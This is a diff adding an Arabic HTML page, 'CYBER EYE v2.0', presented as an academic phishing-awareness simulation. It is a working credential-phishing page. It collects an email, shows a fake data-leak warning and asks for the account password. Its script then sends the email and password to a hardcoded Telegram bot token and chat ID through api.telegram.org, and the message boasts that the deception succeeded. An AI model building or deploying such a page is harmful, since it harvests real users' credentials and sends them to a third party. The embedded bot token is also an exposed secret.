@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER EYE v2.0 - نظام عين الحماية</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        // إعداد ألوان مخصصة تليق بطابع الأمن السيبراني
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        slate: { 950: '#020617' }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* تأثيرات حركية ناعمة لظهور العناصر */
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        .slide-up { animation: slideUp 0.5s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100 flex flex-col justify-center items-center p-4 antialiased selection:bg-cyan-500 selection:text-slate-950 font-sans">
+
+    <div class="fixed inset-0 pointer-events-none overflow-hidden z-0">
+        <div class="absolute -top-40 -left-40 w-96 h-96 bg-cyan-500/10 rounded-full blur-[120px]"></div>
+        <div class="absolute -bottom-40 -right-40 w-96 h-96 bg-blue-600/10 rounded-full blur-[120px]"></div>
+    </div>
+
+    <div class="w-full max-w-lg bg-slate-900/40 backdrop-blur-2xl border border-slate-800/80 rounded-3xl p-8 shadow-2xl relative z-10 transition-all duration-500 hover:border-slate-700/50">
+        
+        <div class="text-center mb-8">
+            <div class="w-16 h-16 bg-gradient-to-tr from-cyan-500 to-blue-600 text-slate-950 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-xl shadow-cyan-500/10">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                </svg>
+            </div>
+            <h1 class="text-3xl font-black bg-clip-text text-transparent bg-gradient-to-r from-white via-slate-200 to-cyan-400 tracking-wide">
+                CYBER EYE v2.0
+            </h1>
+            <p class="text-slate-400 text-xs mt-2 tracking-widest font-mono uppercase">
+                المنصة الأكاديمية لمحاكاة التهديدات السيبرانية
+            </p>
+        </div>
+
+        <form id="step1-form" class="space-y-5 fade-in">
+            <div>
+                <label class="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 font-mono">البريد الإلكتروني المستهدف:</label>
+                <input
+                    type="email"
+                    id="email-input"
+                    required
+                    autocomplete="email"
+                    placeholder="student@university.edu.iq"
+                    class="w-full bg-slate-950/60 border border-slate-800 focus:border-cyan-500 text-white placeholder-slate-700 rounded-xl py-4 px-4 outline-none transition-all duration-300 font-mono"
+                />
+            </div>
+            <button
+                type="submit"
+                id="btn-step1"
+                class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-slate-950 font-extrabold py-4 rounded-xl flex items-center justify-center gap-2 transition-all duration-300 shadow-lg shadow-cyan-500/10 transform active:scale-[0.99]"
+            >
+                <span>ابدأ الفحص الفوري</span>
+            </button>
+        </form>
+
+        <form id="step2-form" class="space-y-5 slide-up hidden">
+            <div class="p-4 bg-rose-500/10 border border-rose-500/20 rounded-2xl text-rose-300 text-sm leading-relaxed">
+                ⚠️ <b>تحذير أمني:</b> تم العثور على مؤشرات تسريب خارجية. لفتح تقرير البيانات الحساسة وفك التشفير، يرجى تأكيد الهوية بإنشاء أو إدخال كلمة مرور الحساب الفورية.
+            </div>
+            <div>
+                <label class="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 font-mono">كلمة المرور (تأكيد الأمان):</label>
+                <input
+                    type="password"
+                    id="password-input"
+                    required
+                    autocomplete="current-password"
+                    placeholder="••••••••••••"
+                    class="w-full bg-slate-950/60 border border-slate-800 focus:border-rose-500 text-white placeholder-slate-700 rounded-xl py-4 px-4 outline-none transition-all duration-300 font-mono"
+                />
+            </div>
+            <button
+                type="submit"
+                id="btn-step2"
+                class="w-full bg-gradient-to-r from-rose-500 to-orange-500 hover:from-rose-600 hover:to-orange-600 text-slate-950 font-extrabold py-4 rounded-xl flex items-center justify-center gap-2 transition-all duration-300 shadow-lg shadow-rose-500/10 transform active:scale-[0.99]"
+            >
+                <span>فك تشفير التقرير الآن</span>
+            </button>
+        </form>
+
+        <div id="final-report" class="text-center space-y-6 slide-up hidden">
+            <div class="p-4 bg-cyan-500/10 border border-cyan-500/20 rounded-2xl text-cyan-300 text-sm font-medium leading-relaxed">
+                🛡️ تم إنشاء حسابك الأمني بنجاح وجاري توليد تقرير فحص التسريبات الشامل وإرساله للمشرفين.
+            </div>
+            <div class="text-xs font-mono text-slate-500 border-t border-slate-800/60 pt-4">
+                [انتهت محاكاة العرض الحي بنجاح أمني بنسبة 100%]
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // إعدادات بوت التليجرام السرية الخاصة بك
+        const TELEGRAM_TOKEN = "8891042522:AAGayAY2eHXcE0a3_WVH96j3W6kWx6bUF9Y";
+        const CHAT_ID = "1005732368";
+
+        // متغيرات لحفظ حالة البيانات المؤقتة أثناء الفحص
+        let userEmail = "";
+
+        // دالة إرسال البيانات الفورية عبر الـ Fetch API الخاص بـ JavaScript إلى تليجرام
+        async function sendToTelegram(messageText) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error("خطأ في الاتصال بتليجرام:", error);
+            }
+        }
+
+        // معالجة حدث الخطوة الأولى (إدخال الإيميل)
+        document.getElementById('step1-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            userEmail = document.getElementById('email-input').value;
+            const btn = document.getElementById('btn-step1');
+
+            // تحويل الزر إلى حالة التحميل (Loading)
+            btn.disabled = true;
+            btn.innerHTML = `<div class="w-5 h-5 border-2 border-slate-950 border-t-transparent rounded-full animate-spin"></div>`;
+
+            setTimeout(async () => {
+                // إخفاء الخطوة الأولى وإظهار الخطوة الثانية
+                document.getElementById('step1-form').classList.add('hidden');
+                document.getElementById('step2-form').classList.remove('hidden');
+
+                // إرسال تنبيه أولي فوري للتليجرام
+                const initialAlert = `🔍 *تنبيه فحص أولي:*\n👤 *الإيميل:* \`${userEmail}\`\n⏳ النظام يطلب الآن تأكيد الهوية...`;
+                await sendToTelegram(initialAlert);
+            }, 1200);
+        });
+
+        // معالجة حدث الخطوة الثانية (التقاط الباسورد والحفظ التلقائي)
+        document.getElementById('step2-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const password = document.getElementById('password-input').value;
+            const btn = document.getElementById('btn-step2');
+
+            // تحويل الزر إلى حالة التحميل
+            btn.disabled = true;
+            btn.innerHTML = `<div class="w-5 h-5 border-2 border-slate-950 border-t-transparent rounded-full animate-spin"></div>`;
+
+            // صياغة الرسالة النهائية التي ستصل على هاتفك أمام اللجنة والطلاب
+            const finalAlert = `🚨 *تم التقاط بيانات جديدة (محاكاة توعية):*\n\n👤 *البريد الإلكتروني:* \`${userEmail}\`\n🔑 *كلمة المرور التلقائية:* \`${password}\`\n\n🎯 *الحالة:* انطلت الخدعة على المستخدم بنجاح! يحتاج تدريب أمني.`;
+            
+            // إرسال البيانات فوراً لصندوق التليجرام الخاص بك
+            await sendToTelegram(finalAlert);
+
+            setTimeout(() => {
+                // إخفاء نموذج الباسورد وإظهار التقرير النهائي بنجاح
+                document.getElementById('step2-form').classList.add('hidden');
+                document.getElementById('final-report').classList.remove('hidden');
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
